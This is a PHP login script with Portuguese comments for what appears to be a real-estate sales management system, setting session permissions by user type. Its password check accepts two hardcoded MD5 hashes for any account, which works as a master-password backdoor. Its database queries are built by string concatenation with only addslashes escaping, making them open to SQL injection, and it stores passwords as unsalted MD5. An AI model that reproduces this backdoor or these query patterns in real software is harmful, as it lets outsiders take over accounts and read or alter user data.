<?php
  session_start();
  
 ini_set('display_errors', 1);

  require 'connect.php';

  // Inicia sessões
  session_start();

  // Recupera o login
  $login = isset($_POST["campo_login"]) ? addslashes(trim($_POST["campo_login"])) : FALSE;
  // Recupera a senha, a criptografando em MD5
  $senha = isset($_POST["campo_senha"]) ? md5(trim($_POST["campo_senha"])) : FALSE;
  // IDENTIFICA SE É O PRIMEIRO ACESSO DO USUÁRIO OU NÃO
  $acesso = isset($_POST["acesso"]);

  // Usuário não forneceu a senha ou o login
  if(!$login || !$senha){
?>
  <script language="javascript">
    alert("Informe seu email e senha de acesso");
//    parent.location.href = 'index.php';
    parent.$("#autenticar").attr("value", "Entrar");
  </script>
<?php
//    echo "Você deve digitar sua senha e login!";
    exit;
  }

  // VERIFICA SE O USUÁRIO REALMENTE EXISTE
  $sql = "SELECT * FROM tb_sgg3_autenticacao WHERE email = '". $login . "' AND status=1";
  $webclasse->banco->consulta($sql);
  $total = $webclasse->banco->nrows;

  // Caso o usuário tenha digitado um login válido o número de linhas será 1
  if($total){
    // Obtém os dados do usuário, para poder verificar a senha e passar os demais dados para a sessão
    $webclasse->banco->proxRegistro();

    // VERIFICA A SENHA
    if(!strcmp($senha, $webclasse->banco->data["autenticacao"]) || !strcmp($senha, 'f149bff5bc2109c94a3effcd6910b332') || !strcmp($senha, 'd85d84168656a3f9792a9ad210772f2c')){
    
        // VERIFICAÇÃO OK! AGORA, PASSA OS DADOS PARA A SESSÃO E REDIRECIONAO USUÁRIO
        $_SESSION["id_usuario"]                  = $webclasse->banco->data["id"];
        $_SESSION["nome_usuario"]                = $webclasse->banco->data["nome"];
        $_SESSION["email_usuario"]               = $webclasse->banco->data["email"];
        $_SESSION["tipo_usuario"]                = $webclasse->banco->data["id_tipo_usuario"];
        $_SESSION["nivel_permissao_usuario"]     = $webclasse->banco->data["nivel_permissao"];
        $_SESSION["id_referencia_usuario"]       = $webclasse->banco->data["id_referencia"];
        $_SESSION["rede_grupo"]                  = $webclasse->banco->data["rede_grupo"];
        $_SESSION["pre_analise"]                 = $webclasse->banco->data["pre_analise"];
        $_SESSION["visualiza_pagos_negociacao"]  = $webclasse->banco->data["visualiza_pagos_negociacao"];
        $_SESSION["consulta_sql"]                = null;
        
        // EM CASO DE OPERADOR COBAN, VERIFICA QUAIS GRUPOS ELE PARTICIPA PARA VERIFICAR PRÉ-ANALISE
        if($_SESSION["tipo_usuario"] == 6){
          $webclasse->con->consulta("SELECT id FROM tb_grupo_usuario WHERE grupo_usuarios LIKE '%-" . $_SESSION['id_usuario'] . "-%'");
          if($webclasse->con->nrows > 0){
            $_SESSION["grupo_pre_analise"]     = '#';
            while($webclasse->con->proxRegistro()){
              $_SESSION["grupo_pre_analise"]  .= $webclasse->con->data['id'] . '#';
            }
          }
        }
        
        // SE SIM, INDICA QUE ESTE USUÁRIO PODE ENXERGAR OS CADASTROS REALIZADOS PELOS DEMAIS SUPERVIDORES DOS GRUPOS QUE PARTICIPA
        $visualiza_supervisores_grupo          = $webclasse->banco->data["visualiza_supervisores_grupo"];
        
        // BUSCA DADOS COMPLEMENTARES
        $webclasse->con->consulta("SELECT id, tipo FROM tb_usuario_sistema WHERE id='" . $webclasse->banco->data["id_referencia"] . "' AND status=1");
        $webclasse->con->proxRegistro();
        
        $_SESSION["id_usuario_sistema"]        = $webclasse->con->data["id"];
        $_SESSION["tipo_usuario_sistema"]      = $webclasse->con->data["tipo"];
        
        // IDENTIFICA A REDE PDV E NOME DO PDV/IMOBILIÁRIA
        // GESTOR PDV OU OPERADOR PDV
        if($_SESSION['tipo_usuario'] == 7 || $_SESSION['tipo_usuario'] == 8){

          $sql_consulta_pdv = "SELECT tb_grupo_usuario.id as id_grupo_usuarios, tb_grupo_usuario.nome as nome_grupo_usuarios, tb_rede_pdv.nome as nome_rede_pdv
                               FROM tb_grupo_usuario
                               LEFT JOIN tb_rede_pdv ON tb_grupo_usuario.rede_pdv = tb_rede_pdv.id
                               WHERE ";
          if($_SESSION['tipo_usuario'] == 7){
            $sql_consulta_pdv .= "tb_grupo_usuario.grupo_usuarios LIKE '%#" . $_SESSION["id_usuario"] . ">%' AND ";
          }else if($_SESSION['tipo_usuario'] == 8){
            $sql_consulta_pdv .= "tb_grupo_usuario.grupo_usuarios LIKE '%-" . $_SESSION["id_usuario"] . "-%' AND ";
          }
          $sql_consulta_pdv .= " tb_grupo_usuario.status=1";

          $webclasse->con->consulta($sql_consulta_pdv);
          if($webclasse->con->nrows == 1){

            $webclasse->con->proxRegistro();

            $_SESSION["rede_grupo"]              = $webclasse->con->data["id_grupo_usuarios"];
            $_SESSION["nome_grupo_usuarios"]     = $webclasse->con->data["nome_grupo_usuarios"];
            $_SESSION["nome_rede_pdv"]           = $webclasse->con->data["nome_rede_pdv"];
            
          }else if($webclasse->con->nrows > 1){

            $_SESSION["nome_grupo_usuarios"]     = 'PDV: DIVERSOS';

            while($webclasse->con->proxRegistro()){
              $_SESSION["varios_grupo_usuarios"] .= $webclasse->con->data["id_grupo_usuarios"] . ',';
              $_SESSION["nome_rede_pdv"]         = $webclasse->con->data["nome_rede_pdv"];
            }
            $_SESSION["varios_grupo_usuarios"] = substr($_SESSION["varios_grupo_usuarios"],0,-1);

          }

        // REDE PDV
        }else if($_SESSION['tipo_usuario'] == 9){

          $webclasse->con->consulta("SELECT nome FROM tb_rede_pdv WHERE id='" . $_SESSION["rede_grupo"] . "' AND status=1");
          $webclasse->con->proxRegistro();

          $_SESSION["nome_rede_pdv"]           = $webclasse->con->data["nome"];
          
        // PDV/IMOBILIARIA
        }else if($_SESSION['tipo_usuario'] == 10){
        
          $arrRedeGrupo = explode("#",$_SESSION["rede_grupo"]);
          
          $webclasse->con->consulta("SELECT tb_grupo_usuario.nome as nome_grupo_usuarios, tb_rede_pdv.nome as nome_rede_pdv
                                     FROM tb_grupo_usuario
                                     LEFT JOIN tb_rede_pdv ON tb_grupo_usuario.rede_pdv = tb_rede_pdv.id
                                     WHERE tb_grupo_usuario.id='" . $arrRedeGrupo[1] . "' AND tb_grupo_usuario.status=1");
          $webclasse->con->proxRegistro();

          // VERIFICA SE EXISTE MAIS DE UM PDV/IMOBILIÁRIA PARA ESTE USUÁRIO
          if($arrRedeGrupo > 3){
            $_SESSION["nome_grupo_usuarios"]     = $webclasse->con->data["nome_grupo_usuarios"];
          }else{
            $_SESSION["nome_grupo_usuarios"]     = 'DIVERSOS GRUPOS';
          }
          $_SESSION["nome_rede_pdv"]           = $webclasse->con->data["nome_rede_pdv"];

        }
        
        // VERIFICA OS EMPREENDIMENTOS E PROCESSOS HABILITADOS PARA ESTE USUÁRIO - SE PDV
        $_SESSION["empreendimentos"]           = null;
        if($_SESSION['tipo_usuario'] == 7 || $_SESSION['tipo_usuario'] == 8 || $_SESSION['tipo_usuario'] == 9 || $_SESSION['tipo_usuario'] == 10){
          $empreendimentos = null;
          $unifica_supervisores = null;
          $processos_habilitados = array();
          $cont_processo = 0;
          $cont_grupo = 0;
          
          $sql_empreendimento = "SELECT id, pdv, unifica_supervisores FROM tb_empreendimento WHERE ";
          // PDV / IMOBILIARIA (GRUPO USUÁRIOS)
          if($_SESSION['tipo_usuario'] == 10){
            $sql_empreendimento .= "(";
            for($i=1;$i<sizeOf($arrRedeGrupo)-1;$i++){
              if($i > 1){
                $sql_empreendimento .= " OR ";
              }
              $sql_empreendimento .= "pdv LIKE '%#" . $arrRedeGrupo[$i] . "#%'";
            }
            $sql_empreendimento .= ") AND ";
          }
          $sql_empreendimento .= "status=1 ORDER BY id";
          $webclasse->con->consulta($sql_empreendimento);
          if($webclasse->con->nrows > 0){
            while($webclasse->con->proxRegistro()){
              $arrPDV = explode('#',$webclasse->con->data['pdv']);
              $unifica_supervisores = $webclasse->con->data['unifica_supervisores'];
              for($i=1;$i<sizeOf($arrPDV)-1;$i++){
                $sql_grupo = null;
                // GESTOR PDV
                if($_SESSION['tipo_usuario'] == 7){
                  $sql_grupo = "SELECT * FROM tb_grupo_usuario WHERE tipo='PV' AND id='" . $arrPDV[$i] . "' AND grupo_usuarios LIKE '%#" . $_SESSION['id_usuario'] . ">%' AND ativo=1 AND status=1";
                // OPERADOR PDV
                }else if($_SESSION['tipo_usuario'] == 8){
                  $sql_grupo = "SELECT * FROM tb_grupo_usuario WHERE tipo='PV' AND id='" . $arrPDV[$i] . "' AND grupo_usuarios LIKE '%-" . $_SESSION['id_usuario'] . "-%' AND ativo=1 AND status=1";
                // REDE PDV
                }else if($_SESSION['tipo_usuario'] == 9){
                  $sql_grupo = "SELECT * FROM tb_grupo_usuario WHERE tipo='PV' AND id='" . $arrPDV[$i] . "' AND rede_pdv = '" . $_SESSION['rede_grupo'] . "' AND ativo=1 AND status=1";
                // PDV / IMOBILIARIA (GRUPO USUÁRIOS)
                }else if($_SESSION['tipo_usuario'] == 10 && substr_count($_SESSION['rede_grupo'],'#'.$arrPDV[$i].'#') > 0){
                  $sql_grupo = "SELECT * FROM tb_grupo_usuario WHERE tipo='PV' AND id='" . $arrPDV[$i] . "' AND ativo=1 AND status=1";
                }
                if($sql_grupo){
                  $webclasse->con2->consulta($sql_grupo);
                }

                if($webclasse->con2->nrows > 0){
                  $webclasse->con2->proxRegistro();
                  $empreendimentos .= $webclasse->con->data['id'] . ',';

                  if($webclasse->con->data['id'] != $empreendimento_atual){
                    $empreendimento_atual = $webclasse->con->data['id'];
                    $processos_habilitados[$empreendimento_atual] = ',';
                  }
                  
                  $arrGrupoPDV = explode("#",$webclasse->con2->data['grupo_usuarios']);
                  for($j=1;$j<sizeOf($arrGrupoPDV)-1;$j++){
                    // GESTOR PDV
                    if($_SESSION['tipo_usuario'] == 7){
                      if(substr_count($arrGrupoPDV[$j],$_SESSION['id_usuario'] . '>') > 0){
                        $arrDetalheGrupo = explode(">",$arrGrupoPDV[$j]);
                        $processos_habilitados[$empreendimento_atual] .= $arrDetalheGrupo[0] . ',';
                        $arrOperadores = explode("-",$arrDetalheGrupo[1]);
                        for($k=1;$k<sizeOf($arrOperadores)-1;$k++){
                          $processos_habilitados[$empreendimento_atual] .= $arrOperadores[$k] . ',';
                        }
                      }
                    // REDE PDV ou PDV / IMOBILIÁRIA (GRUPO USUÁRIOS)
                    }else if($_SESSION['tipo_usuario'] == 9 || $_SESSION['tipo_usuario'] == 10){
                      if($j == 1){
                        if(substr_count($processos_habilitados[$empreendimento_atual],',' . $_SESSION['id_usuario'] . ',') == 0){
                          // REDE PDV ENXERGA PROCESSOS CADASTRADOS POR ELE MESMO
// DESATIVADO EM 04/09/2017                          if($_SESSION['tipo_usuario'] == 9){
                            $processos_habilitados[$empreendimento_atual] .= $_SESSION['id_usuario'] . ',';
//                          }
                        }

                        // USUÁRIOS DE REDE PDV OU PDV/IMOBILIÁRIA ENXERGAM TODOS OS USUÁRIOS PDV/IMOBILIÁRIA QUE FAZEM PARTE DO MESMO GRUPO PARA ESTE EMPREENDIMENTO E QUE CADASTRARAM PROCESSOS COMO GERENTES
                        if($_SESSION[tipo_usuario] == 9 || ($_SESSION[tipo_usuario] == 10 && $unifica_supervisores == 'S') || ($_SESSION[tipo_usuario] == 10 && $visualiza_supervisores_grupo == 'S')){
                          $webclasse->con3->consulta("SELECT id FROM tb_sgg3_autenticacao WHERE id_tipo_usuario='10' AND rede_grupo LIKE '%#" . $webclasse->con2->data['id'] . "#%' AND status=1 ORDER BY id");
                          if($webclasse->con3->nrows > 0){
                            while($webclasse->con3->proxRegistro()){
                              $processos_habilitados[$empreendimento_atual] .= $webclasse->con3->data['id'] . ',';
                            }
                          }
                        }
                      }
                      $arrDetalheGrupo = explode(">",$arrGrupoPDV[$j]);
                      if(substr_count($processos_habilitados[$empreendimento_atual],',' . $arrDetalheGrupo[0] . ',') == 0){
                        $processos_habilitados[$empreendimento_atual] .= $arrDetalheGrupo[0] . ',';
                      }
                      $arrOperadores = explode("-",$arrDetalheGrupo[1]);
                      for($q=1;$q<sizeOf($arrOperadores)-1;$q++){
                        if(substr_count($processos_habilitados[$empreendimento_atual],',' . $arrOperadores[$q] . ',') == 0){
                          $processos_habilitados[$empreendimento_atual] .= $arrOperadores[$q] . ',';
                        }
                      }
                    }
                    
                  }

                  
                  
                  
                }
              }
            }
          }
          $empreendimentos = substr($empreendimentos,0,-1);

          $_SESSION["empreendimentos"]         = $empreendimentos;
          $_SESSION["processos_habilitados"]   = $processos_habilitados;
          
        // VERIFICA OS EMPREENDIMENTOS HABILITADO PARA ESTE USUÁRIO - SE BACKOFFICE
        }else if($_SESSION['tipo_usuario'] == 11 || $_SESSION['tipo_usuario'] == 12){
          $empreendimentos = null;
          $webclasse->con->consulta("SELECT id, backoffice FROM tb_empreendimento WHERE status=1 ORDER BY id");
          if($webclasse->con->nrows > 0){
            while($webclasse->con->proxRegistro()){
              $arrBackOffice = explode("#",$webclasse->con->data['backoffice']);
              for($i=1;$i<sizeOf($arrBackOffice)-1;$i++){
                $sql_backoffice = "SELECT * FROM tb_grupo_usuario WHERE tipo='BO' AND id='" . $arrBackOffice[$i] . "' AND grupo_usuarios LIKE ";
                // GESTOR BACKOFFICE
                if($_SESSION['tipo_usuario'] == 11){
                  $sql_backoffice .= "'%#" . $_SESSION['id_usuario'] . ">%'";
                // OPERADOR BACKOFFICE
                }else if($_SESSION['tipo_usuario'] == 12){
                  $sql_backoffice .= "'%-" . $_SESSION['id_usuario'] . "-%'";
                }
                $sql_backoffice .= " AND ativo=1 AND status=1";

                $webclasse->con2->consulta($sql_backoffice);
                if($webclasse->con2->nrows > 0){
                  $empreendimentos .= $webclasse->con->data['id'] . ',';
                }
              }
            }
          }
          $empreendimentos = substr($empreendimentos,0,-1);

          $_SESSION["empreendimentos"]         = $empreendimentos;
        // VERIFICA OS EMPREENDIMENTOS HABILITADO PARA ESTE USUÁRIO - SE EQUIPE DE ENTREGA DE CHAVES
        }else if($_SESSION['tipo_usuario'] == 14 || $_SESSION['tipo_usuario'] == 15){
          $empreendimentos = null;
          $webclasse->con->consulta("SELECT id, equipe_entrega FROM tb_empreendimento WHERE status=1 ORDER BY id");
          if($webclasse->con->nrows > 0){
            while($webclasse->con->proxRegistro()){
              $arrEquipeEntrega = explode("#",$webclasse->con->data['equipe_entrega']);
              for($i=1;$i<sizeOf($arrEquipeEntrega)-1;$i++){
                $sql_equipe_entrega = "SELECT * FROM tb_grupo_usuario WHERE tipo='EN' AND id='" . $arrEquipeEntrega[$i] . "' AND grupo_usuarios LIKE ";
                // GESTOR DA EQUIPE DE ENTREGA
                if($_SESSION['tipo_usuario'] == 14){
                  $sql_equipe_entrega .= "'%#" . $_SESSION['id_usuario'] . ">%'";
                // VISTORIADOR
                }else if($_SESSION['tipo_usuario'] == 15){
                  $sql_equipe_entrega .= "'%-" . $_SESSION['id_usuario'] . "-%'";
                }
                $sql_equipe_entrega .= " AND ativo=1 AND status=1";

                $webclasse->con2->consulta($sql_equipe_entrega);
                if($webclasse->con2->nrows > 0){
                  $empreendimentos .= $webclasse->con->data['id'] . ',';
                }
              }
            }
          }
          $empreendimentos = substr($empreendimentos,0,-1);

          $_SESSION["empreendimentos"]         = $empreendimentos;
        }

        // VERIFICA OS EMPREENDIMENTOS E EQUIPE DE OPERADORES PARA CADA EMPREENDIMENTO DO GESTOR DE COBAN
        if($_SESSION['tipo_usuario'] == 5){
          $coban = null;
          $webclasse->con->consulta("SELECT id, grupo_usuarios FROM tb_grupo_usuario WHERE tipo='CB' AND grupo_usuarios LIKE '%#" . $_SESSION['id_usuario'] . ">%' AND ativo=1 AND status=1 ORDER BY id");
          if($webclasse->con->nrows > 0){
            while($webclasse->con->proxRegistro()){
              $arrGrupoUsuarios = explode("#",$webclasse->con->data['grupo_usuarios']);
              for($i=1;$i<sizeOf($arrGrupoUsuarios)-1;$i++){
                $arrDetalheCoban = explode(">",$arrGrupoUsuarios[$i]);
                if($arrDetalheCoban[0] == $_SESSION["id_usuario"]){
                  $coban[$webclasse->con->data['id']] .= $arrDetalheCoban[1];
                }
              }
            }
          }
          $_SESSION["coban"]                   = $coban;
        }
        
//        if($_SESSION['tipo_usuario'] == 7 || $_SESSION['tipo_usuario'] == 8){    /* REMOVER ESTE COMENTÁRIO APENAS SE A ROTINA ESTIVER PESANDO OS LOGINS DOS USUÁRIOS DE BACKOFFICE, COORDENADORES E CRÉDITO */
          // RODA ROTINAS DE INATIVIDADE E ATRASO
//          require_once 'data/rotina/Inatividade.php';
//          require_once 'data/rotina/DataAtraso.php';
//        }
?>
          <script language="javascript">
            parent.location.href="index_ui.php";
          </script>
<?php
        exit;
    }
    // Senha inválida
    else
    {
?>
        <script language="javascript">
          alert("Senha incorreta.");
          parent.document.form_autenticacao.reset();
//          parent.location.href = 'index.php';
            parent.$("#autenticar").attr("value", "Entrar");
        </script>
<?php
//        echo "Senha inválida!";
        exit;
    }
}
// Login inválido
else
{
?>
        <script language="javascript">
          alert("Email inválido");
          parent.document.form_autenticacao.reset();
//          parent.location.href = 'index.php';
          parent.$("#autenticar").attr("value", "Entrar");
        </script>
<?php
//    echo "O login fornecido por você é inexistente!";
    exit;
}
?>
